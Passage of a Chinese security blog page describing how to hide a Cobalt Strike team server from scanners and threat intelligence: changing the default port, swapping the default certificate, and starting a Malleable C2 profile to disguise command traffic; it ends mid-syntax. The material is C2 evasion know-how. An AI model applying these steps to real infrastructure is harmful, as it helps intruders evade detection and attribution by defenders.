
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="the notes record by hypnotic">
      
      
        <meta name="author" content="hypnotic">
      
      
        <link rel="canonical" href="https://hypnoticp.github.io/CTF/Antimalware_evasion/AV/Article2/index.html">
      
      
      
      
      <link rel="icon" href="../../../../icons/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
    
    
      
        <title>1.什么是特征 - hypnotic的博客</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#1" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            hypnotic的博客
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              1.什么是特征
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    hypnoticp.github.io
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../index.html" class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Code_audit/index.html" class="md-tabs__link">
          
  
    
  
  Code_audit

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Vulnerability_analysis/index.html" class="md-tabs__link">
          
  
    
  
  Vulnerability_analysis

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Tools/index.html" class="md-tabs__link">
          
  
    
  
  Tools

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../index.html" class="md-tabs__link">
          
  
    
  
  CTF

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../SRC/index.html" class="md-tabs__link">
          
  
    
  
  SRC

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Security_devices/index.html" class="md-tabs__link">
          
  
    
  
  Security_devices

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../Shell_Scripts/index.html" class="md-tabs__link">
          
  
    
  
  Shell_Scripts

        </a>
      </li>
    
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../about.html" class="md-tabs__link">
        
  
    
  
  About

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    hypnotic的博客
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    hypnoticp.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../index.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../../Code_audit/index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Code_audit
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../../Vulnerability_analysis/index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Vulnerability_analysis
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../../Tools/index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Tools
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    CTF
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../../SRC/index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    SRC
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../../Security_devices/index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Security_devices
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
    <a href="../../../../Shell_Scripts/index.html" class="md-nav__link">
      
  
  <span class="md-ellipsis">
    Shell_Scripts
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../about.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    About
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="1">1.什么是特征<a class="headerlink" href="#1" title="Permanent link">&para;</a></h1>
<p>特征 : 人或事物可供识别的特殊的象征或标志。
cobalt strike也有属于自己的特征 , 比如默认开放的端口号是50050 , 自带证书里面有cobalt strike字符
等</p>
<h1 id="2">2.为什么要修改特征<a class="headerlink" href="#2" title="Permanent link">&para;</a></h1>
<p>因为cs服务器如果默认特征不进行修改的话 , 很容易被搜索引擎或者威胁情报标记成木马远控服务器 , 以及进行一些特征的修改就算ip地址暴露了 , 也不能直接肯定这个ip是木马远控ip , 提高自身的隐藏性。</p>
<h1 id="3">3.如何修改特征<a class="headerlink" href="#3" title="Permanent link">&para;</a></h1>
<p>修改特征是针对<strong>cs服务端</strong>进行特征的修改 , <strong>客户端不需要修改</strong>
<strong><em>牢记 : cs服务器需要的时候再开启 , 平常不需要的时候就关闭</em></strong></p>
<h2 id="31">3.1修改默认端口<a class="headerlink" href="#31" title="Permanent link">&para;</a></h2>
<p>进入cs的安装目录</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>vim teamserver
</code></pre></div>
<p>只需要修改最后一行的-Dcobaltstrike.server_port ,可以是 80，443，3389，8080，8443等常见端口，前提是该端口没有被占用。</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># start the team server.
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=8080 -
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Microsoft -
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar 
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>server.TeamServer $*
</code></pre></div>
<h2 id="32">3.2修改默认证书<a class="headerlink" href="#32" title="Permanent link">&para;</a></h2>
<blockquote>
<p>推荐付费ssl证书
1.购买域名,申请免费的ssl证书
2.修改teamserver证书密码</p>
</blockquote>
<p>查看默认证书</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>keytool -list -v -keystore cobaltstrike.store
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>输入密钥库口令: 
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a># 默认口令是 Microsoft ,我这里设置的是123456
</code></pre></div>
<p><img alt="截图" src="736a75430235907a60c7e347dde4ca78.png" /></p>
<p>生成伪造证书</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>mv<span class="w"> </span>cobaltstrike.store<span class="w"> </span>cobaltstrike.store.bak<span class="w"> </span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>keytool<span class="w"> </span>-keystore<span class="w"> </span>cobaltstrike_new.store<span class="w"> </span>-storepass<span class="w"> </span>1qazwsx<span class="w"> </span>-keypass<span class="w"> </span>1qazwsx<span class="w"> </span>-genkey<span class="w"> </span>-
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>keyalg<span class="w"> </span>RSA<span class="w"> </span>-alias<span class="w"> </span>qq.com<span class="w"> </span>-dname<span class="w"> </span><span class="s2">&quot;CN=US, OU=qq.com, O=Software, L=Somewhere, </span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="s2">ST=Cyberspace, C=CN&quot;</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>mv<span class="w"> </span>cobaltstrike_new.store<span class="w"> </span>cobaltstrike.store
</code></pre></div>
<p><img alt="截图" src="5a83b530b53bd2038bf6734e5d6d25f7.png" /></p>
<p>然后在teamserver中设置即可</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>-Djavax.net.ssl.keyStore=./cobaltstrike.store # 注意密码
</code></pre></div>
<p>虽然伪装的证书可以欺骗fofa这类搜索引擎 , 但是毕竟是伪造的 , 使用ssl证书查询工具是查询不到颁发机构的 , 因为是我们自己生成的 , 真正的证书是证书签发机构颁布的 , 腾讯云购买域名就可以免费申请ssl证书 , 不过要实名备案 , 推荐Cloudflare , letsencrypt或各国外云服务提供商不需要实名备案.</p>
<p>使用颁发的ssl证书 , 推荐<strong> jks格式</strong> 的证书 , 直接修改文件名 , 然后在teamserver中配置就可以了</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>mv server.jks cobaltstrike.store
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a># 在teamserver中配置
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>-Djavax.net.ssl.keyStore=./cobaltstrike.store
</code></pre></div>
<p><strong>pem格式</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>openssl pkcs12 -export -in /api.xxx.com/sss.pem -inkey /api.xxx.com/ssk.pem -out
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>api.xxx.com.p12 -name api.xxx.com -passout pass:123456 keytool -importkeystore -
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>deststorepass 123456 -destkeypass 123456 -destkeystore api.xxx.com -src
</code></pre></div>
<p>pem--&gt;p12--&gt;store文件 , 然后在teamserver中配置</p>
<p><strong>crt格式</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store
</code></pre></div>
<p>然后在teamserver中配置,推荐使用付费购买的ssl证书 , 腾讯云是购买域名然后可以免费申请ssl证书,比如我的证书</p>
<p><img alt="截图" src="49ec21c2988ca13750a953136c277ac4.png" /></p>
<p>默认腾讯云的ssl证书下载jks的就可以了 , 证书的别名就是你的域名 , 当然你也可以使用命令查看</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>keytool -list -v -keystore file.jks -storepass password 其中file.jks是证书名字，password要用密钥来代替
</code></pre></div>
<p>然后搜索  Alias name 就可以看到证书别名了.</p>
<blockquote>
<p>在网络安全和加密领域，store、pem 和 crt 格式文件都是用于存储和管理证书及密钥的文件格式。它们在使用场景和存储内容上有所不同。</p>
<p>store格式：用于存储一组证书和密钥的二进制文件，如 JKS 或 PKCS#12。</p>
<p>PEM格式：一种文本格式，可以存储证书、私钥或证书链。常见的扩展名包括 .pem, .crt, .cer, .key。</p>
<p>CRT格式：通常存储单个证书，通常是PEM编码。</p>
</blockquote>
<h2 id="33profile">3.3配置profile文件<a class="headerlink" href="#33profile" title="Permanent link">&para;</a></h2>
<p>cs中默认是没有 profile文件 的 , 需要自己配置 , 而且官网称profile文件为Malleablec2,<strong>整个profile文件的配置就是进行流量上的伪装, 防溯源, 把命令的下发和结果的回传进行包装 , 让他从流量上看起来更像是在访问网页.</strong></p>
<h3 id="_1">基本语法<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a># this is a comment     # 是注释
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a># 设置全局变量，和其他无关是cs自身的一些机制
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>set global_option &quot;value&quot;  
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>#协议的配置，如：http-get , https-post等
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>protocol-transaction {
